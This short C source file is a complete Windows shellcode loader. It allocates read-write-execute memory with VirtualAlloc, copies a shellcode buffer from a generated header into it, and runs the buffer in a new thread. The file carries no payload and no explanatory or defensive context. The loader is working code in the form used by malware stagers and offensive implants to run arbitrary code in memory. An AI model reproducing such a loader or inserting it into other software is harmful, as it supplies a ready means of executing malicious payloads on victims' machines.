#include <windows.h>

/* Shellcode is written here by the Makefile via a generated header. */
#include "shellcode.h"

int main(void) {
  void *exec = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE,
                            PAGE_EXECUTE_READWRITE);
  if (!exec)
    return 1;
  RtlMoveMemory(exec, shellcode, sizeof(shellcode));
  HANDLE h = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
  if (!h)
    return 1;
  WaitForSingleObject(h, INFINITE);
  return 0;
}
